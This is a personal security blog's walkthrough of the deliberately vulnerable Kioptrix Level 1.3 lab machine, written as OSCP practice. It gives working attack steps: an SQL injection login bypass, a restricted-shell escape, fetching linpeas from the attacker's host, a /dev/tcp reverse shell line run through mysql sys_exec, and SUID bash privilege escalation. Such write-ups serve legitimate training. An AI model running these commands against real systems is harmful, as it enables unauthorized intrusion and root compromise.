<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Kioptrix Level 1.3 is a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Let&rsquo;s run threader3000 to enumerate the open ports on this box."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content=" Kioptrix - Level 1.3"><meta name=twitter:description content="Kioptrix Level 1.3 is a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Let&rsquo;s run threader3000 to enumerate the open ports on this box."><meta property="og:title" content=" Kioptrix - Level 1.3"><meta property="og:description" content="Kioptrix Level 1.3 is a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Let&rsquo;s run threader3000 to enumerate the open ports on this box."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-08-11-kioptrix-level-1.3/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-08-11T00:00:00+00:00"><meta property="article:modified_time" content="2020-08-11T00:00:00+00:00"><title>Kioptrix - Level 1.3 · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-08-11-kioptrix-level-1.3/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.98.0"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-08-11-kioptrix-level-1.3/>Kioptrix - Level 1.3</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-08-11T00:00:00Z>August 11, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
4-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/oscp/>OSCP</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/sql-injection/>SQL injection</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/mysql/>mysql</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/privilege-escalation/>privilege escalation</a></span></div></div></header><div><p><a href=https://www.vulnhub.com/entry/kioptrix-level-13-4,25>Kioptrix</a> Level 1.3 is a vulnerable machine found on the <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0">NetSecFocus Trophy Room</a> list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.</p><p>First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used <strong>netdiscover -i eth0</strong> until I came across the IP of this machine.</p><p><img src=/assets/img/KioptrixLevel41.png alt="Kioptrix Level 1.3 netdiscover"></p><p>Let&rsquo;s run <strong>threader3000</strong> to enumerate the open ports on this box.</p><p><img src=/assets/img/KioptrixLevel42.png alt="Kioptrix Level 1.3 threader3000"></p><p>Let&rsquo;s run the suggested nmap scan and see what results we get.</p><p><img src=/assets/img/KioptrixLevel43.png alt="Kioptrix Level 1.3 nmap"></p><p>It appears that we have SSH, HTTP and SMB open. Let&rsquo;s connect with rpcclient by running **rpcclient -H [machine IP] -U "" ** to see if anonymous user access is allowed.</p><p><img src=/assets/img/KioptrixLevel44.png alt="Kioptrix Level 1.3 rpcclient anonymous"></p><p>Success! let&rsquo;s run <strong>enumdomusers</strong> to enumerate the users.</p><p><img src=/assets/img/KioptrixLevel45.png alt="Kioptrix Level 1.3 enumdomusers rpcclient"></p><p>I also ran <strong>queryuser</strong> on all the users above, but there was nothing listed in the comments that could be valuable. Next, I decided to take a look at the website.</p><p><img src=/assets/img/KioptrixLevel46.png alt="Kioptrix Level 1.3 website"></p><p>The website asks for login credentials. The two most likely methods of attack are either brute forcing credentials with something like hydra, or with SQL injection. I decided to try some basic SQL injection techniques in the password field first with the three users we uncovered (robert, john, loneferret). After some trial and error, I uncovered that utilizing <strong>&rsquo; OR 1 =1 &ndash; -</strong> in the password field worked and bypassed authentication for john and robert.</p><p><img src=/assets/img/KioptrixLevel47.png alt="Kioptrix Level 1.3 john credentials"></p><p><img src=/assets/img/KioptrixLevel48.png alt="Kioptrix Level 1.3 robert credentials"></p><p>We now had a username and password for <strong>john</strong> and <strong>robert</strong>. I tried to ssh as both of them and was able to get in (even though robert&rsquo;s looks like a base64 encoded password, it is not and works as shown above). For both john and robert, they login with a restricted shell as shown below. Running help shows a minimal amount of commands that can be run from this restricted shell.</p><p><img src=/assets/img/KioptrixLevel49.png alt="Kioptrix Level 1.3 john restricted shell"></p><p>Fortunately, we can use echo to our advantage and break out of the shell with <strong>echo os.system(&rsquo;/bin/bash&rsquo;)</strong>.</p><p><img src=/assets/img/KioptrixLevel410.png alt="Kioptrix Level 1.3 break out of restricted shell"></p><p>Success! We have broken out of the restricted shell. I ran <strong>sudo -l</strong> and neither john or robert could run sudo.</p><p><img src=/assets/img/KioptrixLevel411.png alt="Kioptrix Level 1.3 john sudo -l"></p><p><img src=/assets/img/KioptrixLevel412.png alt="Kioptrix Level 1.3 robert sudo -l"></p><p>Let&rsquo;s do some enumeration and see what we can find, first let&rsquo;s run <strong>cd /tmp</strong> to navigate to the tmp directory which is usually writeable by all.</p><p><img src=/assets/img/KioptrixLevel413.png alt="Kioptrix Level 1.3 cd /tmp"></p><p>Next, on my attacker pc, I hosted a python3 HTTP server from a directory where I had linpeas available.</p><p><img src=/assets/img/KioptrixLevel414.png alt="Kioptrix Level 1.3 python3 http server"></p><p>From the victim PC, run <strong>wget http://[attacker ip]:8000/linpeas.sh</strong> to save linpeas.sh to the /tmp directory. Next, run <strong>chmod +x linpeas.sh</strong> to make it executable</p><p><img src=/assets/img/KioptrixLevel415.png alt="Kioptrix Level 1.3 wget"></p><p>Next, I ran <strong>./linpeas.sh</strong> to enumerate the system. A couple of interesting things showed up related to mysql.</p><p><img src=/assets/img/KioptrixLevel416.png alt="Kioptrix Level 1.3 linpeas.sh"></p><p>It appears that mysql can be logged into as root without a password and you can execute system commands from it. Let&rsquo;s login to mysql with <strong>mysql -U root -N</strong>.</p><p><img src=/assets/img/KioptrixLevel417.png alt="Kioptrix Level 1.3 mysql root login"></p><p>I first ran <strong>show databases;</strong> and then ran <strong>use members;</strong> to select the members database followed by <strong>show tables;</strong> . Next, I ran <strong>select * from members;</strong> to enumerate the data in the table. This only provided us with the login credentials we already had for john and robert.</p><p><img src=/assets/img/KioptrixLevel418.png alt="Kioptrix Level 1.3 enumerate members database"></p><p>Next, I went back to what linpeas mentioned, which is that you can execute commands. The method mentioned did not work, so I did some research and came across <a href=https://recipeforroot.com/mysql-to-system-root/>this article</a>. It mentions <strong>mysqludf_sys.so</strong>, which is mentioned in the linpeas results above. Let&rsquo;s attempt the rest of the commands and see what happens. First, let&rsquo;s run <strong>use mysql;</strong> to select that database.</p><p><img src=/assets/img/KioptrixLevel419.png alt="Kioptrix Level 1.3 use mysql"></p><p>Next, on our attacker PC, let&rsquo;s run <strong>nc -nvlp 4444</strong></p><p><img src=/assets/img/KioptrixLevel420.png alt="Kioptrix Level 1.3 nc reverse listener"></p><p>Next, let&rsquo;s <strong>select sys_exec(&lsquo;bash -i >& /dev/tcp/[attacker ip]/4444 0>&1&rsquo;);</strong>. Unfortunately, this did not work.</p><p><img src=/assets/img/KioptrixLevel421.png alt="Kioptrix Level 1.3 reverse shell failure"></p><p>Let&rsquo;s see if we can make the bash executable a SUID with <strong>select sys_exec(&lsquo;chmod +s /bin/bash&rsquo;);</strong></p><p><img src=/assets/img/KioptrixLevel422.png alt="Kioptrix Level 1.3 chmod /bin/bash"></p><p>This appears to have worked, let&rsquo;s quit mysql and run <strong>cd /bin</strong> followed by <strong>ls -al</strong>. You will see that <strong>bash</strong> is now a SUID.</p><p><img src=/assets/img/KioptrixLevel423.png alt="Kioptrix Level 1.3"></p><p>Since this is an old version of bash, we can run <strong>bash -p</strong>, which runs it in privileged mode utilizing the SUID user, which is root.</p><p><img src=/assets/img/KioptrixLevel424.png alt="Kioptrix Level 1.3 root shell"></p><p>Next, let&rsquo;s navigate run <strong>cd /root</strong> and <strong>ls -al</strong> to list directory contents for the root user. There is a file named congrats.txt. Let&rsquo;s run <strong>cat congrats.txt</strong> to list the contents of this file.</p><p><img src=/assets/img/KioptrixLevel425.png alt="Kioptrix Level 1.3 congrats.txt"></p><p>And we&rsquo;re all set!</p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2022
Kiel Vaughn</section></footer></main><script src=/js/coder.min.f453d26c79f010446cf0d9770197f77de32c07b7a5512d141a286247fe154a22.js integrity="sha256-9FPSbHnwEERs8Nl3AZf3feMsB7elUS0UGihiR/4VSiI="></script></body></html>